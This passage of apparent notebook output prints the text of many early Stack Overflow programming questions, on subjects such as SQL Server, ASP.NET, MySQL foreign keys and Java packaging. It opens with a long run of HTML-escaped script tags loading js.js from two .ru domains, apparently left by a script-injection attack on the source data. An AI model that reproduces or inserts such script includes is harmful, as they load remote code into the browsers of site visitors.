src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script--&gt;\n",
      "\n",
      "\n",
      "I'm having trouble figuring out how to get the testing framework set up and usable in Visual Studio 2008 for C++ presumably with the built-in unit testing suite.\n",
      "\n",
      "Any links or tutorials would be appreciated.\n",
      "\n",
      "Is there anyone working solo and using fogbugz out there? I'm interested in personal experience/overhead versus paper.\r\n",
      "\r\n",
      "I am involved in several projects and get pretty hammered with lots of details to keep track of... Any experience welcome.\r\n",
      "\r\n",
      "(Yes I know Mr. Joel is on the stackoverflow team... I still want good answers :)\n",
      "I'm wondering how to make a release build that includes all necessary dll files into the .exe so the program can be run on a non-development machine without it having to install the microsoft redistributable on the target machine.\r\n",
      "\r\n",
      "Without doing this you get the error message that the application configuration is not correct and to reinstall.  \n",
      "We use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value. To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.\n",
      "\n",
      "This works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.\n",
      "\n",
      "My initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?\n",
      "\n",
      "\n",
      "\n",
      "We do use LabVIEW and I have checked the LAVA forums and there are a number of interesting examples. This is part of our test software and we are trying to avoid using too many non-standard VI libraries so I was hoping for feedback on the process/algorithms involved rather than specific code. \n",
      "\n",
      "Note: I am using SQL's Full-text search capabilities, CONTAINS clauses and all - the * is the wildcard in full-text, % is for LIKE clauses only.\n",
      "\n",
      "I've read in several places now that \"leading wildcard\" searches (e.g. using \"*overflow\" to match \"stackoverflow\") is not supported in MS SQL.  I'm considering using a CLR function to add regex matching, but I'm curious to see what other solutions people might have.\n",
      "\n",
      "More Info: You can add the asterisk only at the end of the word or phrase. - along with my empirical experience:  When matching \"myvalue\", \"my*\" works, but \"(asterisk)value\" returns no match, when doing a query as simple as:\n",
      "\n",
      "SELECT * FROM TABLENAME WHERE CONTAINS(TextColumn, '\"*searchterm\"');\n",
      "\n",
      "\n",
      "Thus, my need for a workaround.  I'm only using search in my site on an actual search page - so it needs to work basically the same way that Google works (in the eyes on a Joe Sixpack-type user). Not nearly as complicated, but this sort of match really shouldn't fail.\n",
      "\n",
      "I have a very simple problem which requires a very quick and simple solution in SQL Server 2005.\n",
      "\n",
      "I have a table with x Columns. I want to be able to select one row from the table and then transform the columns into rows.\n",
      "\n",
      "TableA\n",
      "Column1, Column2, Column3\n",
      "\n",
      "\n",
      "SQL Statement to ruturn\n",
      "\n",
      "ResultA\n",
      "Value of Column1\n",
      "Value of Column2\n",
      "Value of Column3\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "@Kevin: I've had a google search on the topic but alot of the example where overly complex for my example, are you able to help further?\n",
      "\n",
      "@Mario: The solution I am creating has 10 columns which stores the values 0 to 6 and I must work out how many columns have the value 3 or more. So I thought about creating a query to turn that into rows and then using the generated table in a subquery to say count the number of rows with Column >= 3\n",
      "\n",
      "What is BODMAS and why is it useful in programming?\n",
      "I have a Rakefile with a Rake task that I would normally call from the command line:\n",
      "\n",
      "rake blog:post Title\n",
      "\n",
      "\n",
      "I'd like to write a Ruby script that calls that Rake task multiple times, but the only solution I see is shelling out using `` (backticks) or system.\n",
      "\n",
      "What's the right way to do this?\n",
      "\n",
      "I've been working on a project that accesses the WMI to get information about the software installed on a user's machine. We've been querying Win32_Product only to find that it doesn't exist in 64-bit versions of Windows because it's an \"optional component\".\n",
      "\n",
      "I know there are a lot of really good alternatives to querying the WMI for this information, but I've got a bit of a vested interest in finding out how well this is going to work out.\n",
      "\n",
      "What I want to know is if there's some kind of redistributable that can be packaged with our software to allow 64-bit users to get the WMI Installer Provider put onto their machines? Right now, they have to install it manually and the installation requires they have their Windows disc handy.\n",
      "\n",
      "Edit:\n",
      "\n",
      "\n",
      "  You didn't mention for what OS, but the WMI Redistributable Components version 1.0 definitely exists.\n",
      "\n",
      "\n",
      "For Operation System, we've been using .NET 3.5 so we need packages that will work on XP64 and 64bit versions of Windows Vista.\n",
      "\n",
      "What code analysis tools do you use on your Java projects?\n",
      "\n",
      "I am interested in all kinds\n",
      "\n",
      "\n",
      "static code analysis tools (FindBugs, PMD, and any others)\n",
      "code coverage tools (Cobertura, Emma, and any others)\n",
      "any other instrumentation-based tools \n",
      "anything else, if I'm missing something\n",
      "\n",
      "\n",
      "If applicable, also state what build tools you use and how well these tools integrate with both your IDEs and build tools. \n",
      "\n",
      "If a tool is only available a specific way (as an IDE plugin, or, say, a build tool plugin) that information is also worth noting.\n",
      "\n",
      "I've been tasked with redesigning part of a ms-sql database structure which currently involves a lot of views, some of which contain joins to other views. \n",
      "\n",
      "Anyway, I wonder if anyone here could recommend a utility to automatically generate diagrams to help me visualise the whole structure.\n",
      "\n",
      "What's the best program you've used for such problems?\n",
      "\n",
      "I need to learn ADO.NET to build applications based on MS Office. I have read a good deal about ADO.NET in the MSDN Library, but everything seems rather messy to me.\n",
      "\n",
      "What are the basics one must figure out when using ADO.NET? I think a few key words will suffice to let me organize my learning.\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "I've been doing ASP.NET development for a little while now, and I've used both the GridView and the DataGrid controls before for various things, but I never could find a really good reason to use one or the other. I'd like to know:\r\n",
      "\r\n",
      "What is the difference between these 2 ASP.NET controls? What are the advantages or disadvantages of both? Is one any faster? Newer? Easier to maintain?\r\n",
      "\r\n",
      "The intellisense summary for the controls doesn't seem to describe any difference between the two. They both can view, edit, and sort data and automatically generate columns at runtime.\r\n",
      "\r\n",
      "Edit: Visual Studio 2008 no longer lists DataGrid as an available control in the toolbox. It is still available (for legacy support I assume) if you type it in by hand though.\n",
      "Is it \"acceptable\" to have an ASP.Net 2.0 application without the BLL (Business Logic Layer) as the following?\n",
      "\n",
      "\n",
      "SQL Server Data Storage &amp; Stored Procedures\n",
      "Data Link Layer (Strongly Typed Table Adapters) connecting to Stored Procs\n",
      "Presentation Layer ASPX Pages with Code behind and ObjectDataSource for connection straight to the DLL\n",
      "\n",
      "\n",
      "Is a BLL always preferable, even if business logic is entirely validatable in the presentation's code behind?  What are the potential drawbacks for not using a BLL?\n",
      "\n",
      "Is there available any tool for PHP which can be used to generate code for consuming a web service based on its WSDL? Something comparable to clicking \"Add Web Reference\" in Visual Studio or the Eclipse plugin which does the same thing for Java.\n",
      "\n",
      "How is it possible to make prototype methods in C#.Net?\n",
      "\n",
      "In JavaScript, I can do the following to create a trim method for the string object:\n",
      "\n",
      "String.prototype.trim = function() {\n",
      "    return this.replace(/^\\s+|\\s+$/g,\"\");\n",
      "}\n",
      "\n",
      "\n",
      "How can I go about doing this in C#.Net?\n",
      "\n",
      "Example: I have two shared objects (same should apply to .dlls). The first shared object is from a third-party library, we'll call it libA.so. I have wrapped some of this with JNI and created my own library, libB.so. Now libB depends on libA.\r\n",
      "\r\n",
      "When webstarting, both libraries are places in some webstart working area. My java code attempts to load libB. At this point the system loader will attempt to load libA which is not in the system library path (java.library.path won't help this). The end result is that libB has an unsatisfied link and cannot be used. \r\n",
      "\r\n",
      "I have tried loading libA before libB, but that still does not work. Seems the OS wants to do that loading for me. Is there any way I can make this work other than statically  compiling?\n",
      "So I want to get a project on a distributed version control system, such as mercurial, git, or bazaar.  The catch is that I need the Windows support to be good, i.e. no instructions that start off with \"install cygwin...\".  Now I've heard that git's Windows support is decent these days, but don't have any first hand experience.  Also, it sounds like the bazaar team has an explicit goal of making it as multiplatform as possible.\r\n",
      "Can I get any recommendations?\n",
      "I am new to C# and am doing some work in an existing application. I have a DirectX viewport that has components in it that I want to be able to position using arrow keys.\n",
      "\n",
      "Currently I am overriding ProcessCmdKey and catching arrow input and send an OnKeyPress event. This works, but I want to be able to use modifiers(ALT+CTRL+SHIFT). As soon as I am holding a modifier and press an arrow no events are triggered that I am listening to.\n",
      "\n",
      "Does anyone have any ideas or suggestions on where I should go with this?\n",
      "\n",
      "We have a question with regards to XML-sig and need detail about the optional elements as well as some of the canonicalization and transform stuff.  We're writing a spec for a very small XML-syntax payload that will go into the metadata of media files and it needs to by cryptographically signed.  Rather than re-invent the wheel, We thought we should use the XML-sig spec but I think most of it is overkill for what we need, and so we like to have more information/dialogue with people who know the details.\n",
      "\n",
      "Specifically, do we need to care about either transforms or canonicalization if the XML is very basic with no tabs for formatting and is specific to our needs?\n",
      "\n",
      "I'm writing a Telnet client of sorts in C# and part of what I have to parse are ANSI/VT100 escape sequences, specifically, just those used for colour and formatting (detailed here).\n",
      "\n",
      "One method I have is one to find all the codes and remove them, so I can render the text without any formatting if needed:\n",
      "\n",
      "    \n",
      "public static string StripStringFormating(string formattedString)\n",
      "{\n",
      "    if (rTest.IsMatch(formattedString))\n",
      "        return rTest.Replace(formattedString, string.Empty);\n",
      "    else\n",
      "        return formattedString;\n",
      "}\n",
      "\n",
      "\n",
      "I'm new to regular expressions and I was suggested to use this:\n",
      "\n",
      "static Regex rText = new Regex(@\"\\e\\[[\\d;]+m\", RegexOptions.Compiled);\n",
      "\n",
      "However, this failed if the escape code was incomplete due to an error on the server. So then this was suggested, but my friend warned it might be slower (this one also matches another condition (z) that I might come across later):\n",
      "\n",
      "static Regex rTest = \n",
      "              new Regex(@\"(\\e(\\[([\\d;]*[mz]?))?)?\", RegexOptions.Compiled);\n",
      "\n",
      "This not only worked, but was in fact faster to and reduced the impact on my text rendering. Can someone explain to a regexp newbie, why? :)\n",
      "\n",
      "My organization has a form to allow users to update their email address with us.\r\n",
      "It's suggested that we have two input boxes for email: the second as an email confirmation.\r\n",
      "\r\n",
      "I always copy/paste my email address when faced with the confirmation.\r\n",
      "I'm assuming most of our users are not so savvy.\r\n",
      "\r\n",
      "Regardless, is this considered a good practice?\r\n",
      "I can't stand it personally, but I also realize it probably isn't meant for me.\r\n",
      "If someone screws up their email, they can't login, and they must call to sort things out.\n",
      "I'm developing a Sharepoint application and use .NET AjaxControlToolkit library, we are adding a custom aspx page to the Sharepoint. Sharepoint 2007 run in quirks mode so I've made some modification to the AJAX library to make it behave like it normally should. The problem is, the other team already use AJAX library and it is a different version with mine. This cause conflict because there could be only one dll in the bin folder with the same name.\r\n",
      "\r\n",
      "From what I know, .NET should be able to handle this situation easily. I've tried using strong name and GAC to solve it, but it still refer to the dll in the bin folder. If there is no AjaxControlToolkit.dll in the bin folder, the application will simply fail to load the assembly. \r\n",
      "\r\n",
      "If I use complete assembly information on my like this \r\n",
      "\r\n",
      "&lt;%@     Register     tagprefix=\"AjaxControlToolkit\"    namespace=\"AjaxControlToolkit\"    assembly=\"AjaxControlToolkit, Version=1.0.299.18064,     PublicKeyToken=12345678abcdefgh,     Culture=neutral\"%&gt;\r\n",
      "\r\n",
      "It gives me Compiler Error CS0433\r\n",
      "\r\n",
      "Can someone help me on how to use multiple version of assembly in an application?\n",
      "I was wondering if there are any alternatives to Microsoft's SQL Server Management Studio?\n",
      "\n",
      "Not there's anything wrong with SSMS, but sometimes it just seem too big an application where all I want todo is browse/edit tables and run queries.\n",
      "\n",
      "I have a situation where I want to add hours to a date and have the new date wrap around the work-day. I cobbled up a function to determine this new date, but want to make sure that I'm not forgetting anything.\n",
      "\n",
      "The hours to be added is called \"delay\". It could easily be a parameter to the function instead.\n",
      "\n",
      "Please post any suggestions. [VB.NET Warning]\n",
      "\n",
      "Private Function GetDateRequired() As Date\n",
      "    ''// A decimal representation of the current hour\n",
      "    Dim hours As Decimal = Decimal.Parse(Date.Now.Hour) + (Decimal.Parse(Date.Now.Minute) / 60.0) \n",
      "\n",
      "    Dim delay As Decimal = 3.0           ''// delay in hours\n",
      "    Dim endOfDay As Decimal = 12.0 + 5.0 ''// end of day, in hours\n",
      "    Dim startOfDay As Decimal = 8.0      ''// start of day, in hours\n",
      "\n",
      "    Dim newHour As Integer\n",
      "    Dim newMinute As Integer\n",
      "\n",
      "    Dim dateRequired As Date = Now\n",
      "    Dim delta As Decimal = hours + delay\n",
      "\n",
      "    ''// Wrap around to the next day, if necessary\n",
      "    If delta &gt; endOfDay Then\n",
      "        delta = delta - endOfDay\n",
      "        dateRequired = dateRequired.AddDays(1)\n",
      "\n",
      "        newHour = Integer.Parse(Decimal.Truncate(delta))\n",
      "        newMinute = Integer.Parse(Decimal.Truncate((delta - newHour) * 60))\n",
      "        newHour = startOfDay + newHour\n",
      "    Else\n",
      "        newHour = Integer.Parse(Decimal.Truncate(delta))\n",
      "        newMinute = Integer.Parse(Decimal.Truncate((delta - newHour) * 60))\n",
      "    End If\n",
      "\n",
      "    dateRequired = New Date(dateRequired.Year, dateRequired.Month, dateRequired.Day, newHour, newMinute, 0)\n",
      "\n",
      "    Return dateRequired\n",
      "End Sub\n",
      "\n",
      "\n",
      "Note: This will probably not work if delay is more than 9 hours long. It should never change from 3, through.\n",
      "\n",
      "EDIT:\n",
      "The goal is find the date and time that you get as a result of adding several hours to the current time. This is used to determine a default value for a due date of a submission. I want to add 3 hours to the current time to get the due date time. However, I don't want due dates that go beyond 5pm on the current day. So, I tried to have the hours split between (today, up to 5pm) and (tomorrow, from 8am on), such that adding 3 hours to 4pm would give you 19am, because 1 hour is added to the end of today and 2 hours are added to the beginning of tomorrow.\n",
      "\n",
      "The company I work for is wanting to add blog functionality to our website and they were looking to spend an awful amount of money to have some crap being built on top of a CMS they purchased (sitecore).  I pointed them to Telligent's Community Server and  we had a sales like meeting today to get the Marketing folks on board. \r\n",
      "My question is if anyone has had issues working with Community Server, skinning it and extending it?\r\n",
      "I wanted to explain a bit why I am thinking Community Server, the company is wanting multiple blogs with multiple authors.  I want to be out of the admin part of this as much as possible and didn't think there were too many engines that having multiple blogs didn't mean db work.  I also like the other functionality that Community Server provides and think the company will find it useful, particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuff.\r\n",
      "\r\n",
      "edit: We are actually using the Sitecore blog module for a single blog on our intranet (which is actually what the CMS is serving).  Some reasoning for why I don't like it for our public site are they are on different servers, it doesn't support multiple authors, there is no built in syndication, it is a little flimsy feeling to me from looking at the source and I personally think the other features of Community Server make its price tag worth it.\r\n",
      "\r\n",
      "another edit: Need to stick to .net software that run on sql server in my company's case, but I don't mind seeing recommendations for others.  ExpressionEngine looks promising, will try it out on my personal box.\n",
      "I have several tables whose only unique data is a uniqueidentifier (a Guid) column. Because guids are non-sequential (and they're client-side generated so I can't use newsequentialid()), I have made a non-primary, non-clustered index on this ID field rather than giving the tables a clustered primary key.\n",
      "\n",
      "I'm wondering what the performance implications are for this approach. I've seen some people suggest that tables should have an auto-incrementing (\"identity\") int as a clustered primary key even if it doesn't have any meaning, as it means that the database engine itself can use that value to quickly look up a row instead of having to use a bookmark.\n",
      "\n",
      "My database is merge-replicated across a bunch of servers, so I've shied away from identity int columns as they're a bit hairy to get right in replication.\n",
      "\n",
      "What are your thoughts? Should tables have primary keys? Or is it ok to not have any clustered indexes if there are no sensible columns to index that way?\n",
      "\n",
      "I have a route that I am calling through a RedirectToRoute like this:\n",
      "\n",
      "return this.RedirectToRoute(\"Super-SuperRoute\", new { year = selectedYear });\n",
      "\n",
      "\n",
      "I have also tried:\n",
      "\n",
      " return this.RedirectToRoute(\"Super-SuperRoute\", new { controller = \"Super\", action = \"SuperRoute\", id = \"RouteTopic\", year = selectedYear });\n",
      "\n",
      "\n",
      "The route in the global.asax is like this:\n",
      "\n",
      "routes.MapRoute(\n",
      "    \"Super-SuperRoute\", // Route name\n",
      "    \"Super.mvc/SuperRoute/{year}\",  // URL with parameters\n",
      "     new { controller = \"Super\", action = \"SuperRoute\", id = \"RouteTopic\" }  // Parameter defaults\n",
      ");\n",
      "\n",
      "\n",
      "So why do I get the error: \"No route in the route table matches the supplied values.\"?\n",
      "\n",
      "I saw that the type of selectedYear was var.  When I tried to convert to int with int.Parse I realised that selectedYear was actually null, which would explain the problems.  I guess next time I'll pay more attention to the values of the variables at a breakpoint :)\n",
      "\n",
      "I'm pretty new to my company (2 weeks) and we're starting a new platform for our system using .NET 3.5 Team Foundation from DotNetNuke. Our \"architect\" is suggesting we use one class project. Of course, I chime back with a \"3-tier\" architecture (Business, Data, Web class projects). \r\n",
      "\r\n",
      "Is there any disadvantages to using this architecture? Pro's would be separation of code from data, keeping class objects away from your code, etc.\n",
      "We are in the early design stages of a major rewrite of our product. Right now our customers are mostly businesses. We manage accounts. User names for an account are each on their own namespace but it means that we can't move assets between servers.\r\n",
      "\r\n",
      "We want to move to a single namespace. But that brings the problem of unique user names.\r\n",
      "\r\n",
      "So what's the best idea?\r\n",
      "\r\n",
      "\r\n",
      "Email address (w/verification) ?\r\n",
      "Unique alpha-numeric string (\"johnsmith9234\")?\r\n",
      "Should we look at OpenID?\r\n",
      "\n",
      "I've been handed a table with about 18000 rows. Each record describes the location of one customer. The issue is, that when the person created the table, they did not add a field for \"Company Name\", only \"Location Name,\" and one company can have many locations.\n",
      "\n",
      "For example, here are some records that describe the same customer:\n",
      "\n",
      "Location Table\n",
      "\n",
      " ID  Location_Name     \n",
      " 1   TownShop#1        \n",
      " 2   Town Shop - Loc 2 \n",
      " 3   The Town Shop     \n",
      " 4   TTS - Someplace   \n",
      " 5   Town Shop,the 3   \n",
      " 6   Toen Shop4        \n",
      "\n",
      "\n",
      "My goal is to make it look like:\n",
      "\n",
      "Location Table\n",
      "\n",
      " ID  Company_ID   Location_Name     \n",
      " 1   1            Town Shop#1       \n",
      " 2   1            Town Shop - Loc 2 \n",
      " 3   1            The Town Shop     \n",
      " 4   1            TTS - Someplace   \n",
      " 5   1            Town Shop,the 3   \n",
      " 6   1            Toen Shop4        \n",
      "\n",
      "\n",
      "Company Table\n",
      "\n",
      " Company_ID  Company_Name  \n",
      " 1           The Town Shop \n",
      "\n",
      "\n",
      "There is no \"Company\" table, I will have to generate the Company Name list from the most descriptive or best Location Name that represents the multiple locations.\n",
      "\n",
      "Currently I am thinking I need to generate a list of Location Names that are similar, and then and go through that list by hand.\n",
      "\n",
      "Any suggestions on how I can approach this is appreciated.\n",
      "\n",
      "@Neall, Thank you for your statement, but unfortunately, each location name is distinct, there are no duplicate location names, only similar. So in the results from your statement \"repcount\" is 1 in each row.\n",
      "\n",
      "@yukondude, Your step 4 is the heart of my question.\n",
      "\n",
      "I'm using subclipse in Flex Builder 3, and recently received this error when trying to commit:\n",
      "\n",
      "svn: Checksum mismatch for '/Users/redacted/Documents/Flex Builder 3/path/to/my/file.mxml'; expected: 'f8cb275de72776657406154dd3c10348', actual: 'null'\n",
      "\n",
      "I worked around it by:\n",
      "\n",
      "\n",
      "Committing all the other changed files, omitting the troublesome one.\n",
      "Copying the contents of the trouble file to a TextMate window\n",
      "Deleting my project in FlexBuilder/Eclipse\n",
      "Checking my project out fresh from SVN\n",
      "Copying the text of the trouble file back in from the TextMate Window\n",
      "Committing the changes.\n",
      "\n",
      "\n",
      "It worked, but I can't help but think there's a better way. What's actaully happening to cause the svn:checksum error, and what's the best fix.\n",
      "\n",
      "Maybe more important -- is this a symptom of a greater problem?\n",
      "\n",
      "In a .net system I'm building, there is a need for automated e-mail notifications. These should be editable by an admin. What's the easiest way to do this? SQL table and WYSIWIG for editing?\n",
      "\n",
      "\n",
      "\n",
      "The queue is a great idea. I've been throwing around that type of process for awhile with my old company.\n",
      "\n",
      "I've got a table that is supposed to track days and costs for shipping product from one vendor to another. We (brilliantly :p) stored both the shipping vendors (FedEx, UPS) with the product handling vendors (Think... Dunder Mifflin) in a \"VENDOR\" table. So, I have three columns in my SHIPPING_DETAILS table that all reference VENDOR.no. For some reason MySQL isn't letting me define all three as foreign keys. Any ideas?\n",
      "\n",
      "CREATE TABLE SHIPPING_GRID(  \n",
      "    id INT NOT NULL AUTO_INCREMENT PRIMARY KEY COMMENT 'Unique ID for each row',  \n",
      "    shipping_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the shipping vendor (vendors_type must be 3)',  \n",
      "    start_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the vendor being shipped from',  \n",
      "    end_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to the VENDOR.no for the vendor being shipped to',  \n",
      "    shipment_duration INT(1) DEFAULT 1 COMMENT 'Duration in whole days shipment will take',  \n",
      "    price FLOAT(5,5) NOT NULL COMMENT 'Price in US dollars per shipment lbs (down to 5 decimal places)',  \n",
      "    is_flat_rate TINYINT(1) DEFAULT 0 COMMENT '1 if is flat rate regardless of weight, 0 if price is by lbs',  \n",
      "    INDEX (shipping_vendor_no),  \n",
      "    INDEX (start_vendor_no),  \n",
      "    INDEX (end_vendor_no),  \n",
      "    FOREIGN KEY (shipping_vendor_no) REFERENCES VENDOR (no),  \n",
      "    FOREIGN KEY (start_vendor_no) REFERENCES VENDOR (no),  \n",
      "    FOREIGN KEY (end_vendor_no) REFERENCES VENDOR (no)  \n",
      ") TYPE = INNODB;\n",
      "\n",
      "\n",
      "Edited to remove double primary key definition...\n",
      "\n",
      "\n",
      "\n",
      "Yeah, unfortunately that didn't fix it though. Now I'm getting:\n",
      "\n",
      "\n",
      "  Can't create table\n",
      "  './REMOVED MY DB NAME/SHIPPING_GRID.frm'\n",
      "  (errno: 150)\n",
      "\n",
      "\n",
      "Doing a phpinfo() tells me this for mysql:\n",
      "\n",
      "\n",
      "  Client API version    5.0.45\n",
      "\n",
      "\n",
      "Yes, the VENDOR.no is type int(6).\n",
      "\n",
      "I'm suddenly back to WinForms, after years of web development, and am having trouble  with something that should be simple.  I have an ArrayList of business objects bound to a  Windows Forms DataGrid.  I'd like the user to be able to edit the cells, and when finished,  press a Save button.  At that point I'd like to iterate the all the rows and columns in the  DataGrid to find any changes, and save them to the database.  But I can't find a way to  access the DataGrid rows.  \n",
      "\n",
      "I'll also want to validate individual cells real time, as they are edited, but I'm pretty  sure that can be done.  (Maybe not with an ArrayList as the DataSource?)  But as for iterating the DataGrid, I'm quite surprised it doesn't seem possible.\n",
      "\n",
      "Must I really stuff my business objects data into datatables in order to use the datagrid?  \n",
      "\n",
      "I've been using a lot of new .NET 3.5 features in the work that I've been doing, lately. The application that I'm building is intended for distribution among consumers who will probably not have the latest version (or perhaps any version) of the .NET framework on their machines.\r\n",
      "I went to go download the .NET 3.5 redistributable package only to find out that it's almost 200 MB! This is unacceptable for my application, because it's supposed to be a quick and painless consumer application that installs quickly and keeps a low profile on the user's machine. For users that have .NET 3.5 already installed, our binary downloads have been instantaneous, so far. This 200 MB gorilla will more than quadruple the size of the download. Is there any other option than this redistributable package that I can use to make sure the framework is on the machine that won't take the user out of our \"quick and painless\" workflow? Our target time from beginning of download to finalizing the install is less than two minutes. Is it just not possible for someone who doesn't already have .NET installed?\n",
      "I have a ASP.NET application that we've written our own logging module for.\n",
      "\n",
      "My question is, where is the standard place to write a log file to? I.e. the website will be running as the anonymous user identity (e.g. IUSR on IIS7) and I need a place where I know it'll have permission to write to.\n",
      "\n",
      "Cheers,\n",
      "\n",
      "I have some code for starting a thread on the .NET CF 2.0:\n",
      "\n",
      "ThreadStart tStart = new ThreadStart(MyMethod);\n",
      "Thread t = new Thread(tStart);\n",
      "t.Start();\n",
      "\n",
      "\n",
      "If I call this inside a loop the items complete out of order. How do introduce a wait after t.Start(), so that the work on the thread completes before the code continues? Will BeginInvoke/EndInvoke be a better option for this than manually creating threads?\n",
      "\n",
      "What is a good way to perform animation using .NET?\n",
      "\n",
      "I would prefer not to use Flash if possible, so am looking for suggestions of ways which will work to implement different types of animation on a new site I am producing.\n",
      "\n",
      "The new site is for a magician, so I want to provide animated buttons (Cards turning over, etc.) and also embed video.  Is it possible to do this without using Flash or is this the only real solution?  I would like to keep it as cross-platform and standard as possible.\n",
      "\n",
      "What tools would you recommend for setting up CI for build and deployment of multiple websites built on DotNetNuke using SVN for source control? \n",
      "\n",
      "We are currently looking at configuring Cruise Control to work with NAnt, NUnit, NCover and Trac as a test case. What other combinations would worth investigating?\n",
      "\n",
      "We have full control of our development environment so using some form of CI is certain here but I would also like to convince our production services team that they can reliably deploy to the system test, uat and even production environments using these tools.\n",
      "\n",
      "How do I setup Public-Key Authentication for SSH?\n",
      "\n",
      "The company I'm currently working for is using Selenium for Uniting-Testing our User Interface. What do you use to Unit-Test your Web UI and how effective do you find it? \n",
      "\n",
      "After a couple hours fighting with the Gallery2 RSS module and getting only the message, \"no feeds have yet been defined\", I gave up.  Based on a Google search for \"no feeds have yet been defined\", this is a pretty common problem.  Do you have any tips and/or tricks for getting the Gallery2 RSS module to work?  Or any tips for a relatively-PHP-ignorant developer trying to debug problems with this PHP application?\n",
      "\n",
      "Recently I have been having issues with Firefox 3 on Ubuntu Hardy Heron.\n",
      "\n",
      "I will click on a link and it will hang for a while.  I don't know if its a bug in Firefox 3 or a page running too much client side JavaScript, but I would like to try and debug it a bit.\n",
      "\n",
      "So, my question is \"is there a way to have some kind of process explorer, or task manager sort of thing for Firefox 3?\"\n",
      "\n",
      "I would like to be able to see what tabs are using what percent of my processor via the JavaScript on that page (or anything in the page that is causing CPU/memory usage).  \n",
      "\n",
      "Does anybody know of a plugin that does this, or something similar?  Has anyone else done this kind of inspection another way?\n",
      "\n",
      "I know about FireBug, but I can't imagine how I would use it to finger which tab is using a lot of resources.\n",
      "\n",
      "Any suggestions or insights?\n",
      "\n",
      "I am writing an application in Java for the desktop using the Eclipse SWT library for GUI rendering.  I think SWT helps Java get over the biggest hurdle for acceptance on the desktop: namely providing a Java application with a consistent, responsive interface that looks like that belonging to any other app on your desktop.  However, I feel that packaging an application is still an issue.  \n",
      "\n",
      "OS X natively provides an easy mechanism for wrapping Java apps in native application bundles, but producing an app for Windows/Linux that doesn't require the user to run an ugly batch file or click on a .jar is still a hassle.  Possibly that's not such an issue on Linux, where the user is likely to be a little more tech-savvy, but on Windows I'd like to have a regular .exe for him/her to run.\n",
      "\n",
      "Has anyone had any experience with any of the .exe generation tools for Java that are out there?  I've tried JSmooth but had various issues with it.  Is there a better solution before I crack out Visual Studio and roll my own?\n",
      "\n",
      "Edit:  I should perhaps mention that I am unable to spend a lot of money on a commercial solution.\n",
      "\n",
      "I want to open a file for reading, the C++ way. I need to be able to do it for:\n",
      "\n",
      "\n",
      "text files, which would involve some sort of read line function.\n",
      "binary files, which would provide a way to read raw data into a char* buffer.\n",
      "\n",
      "\n",
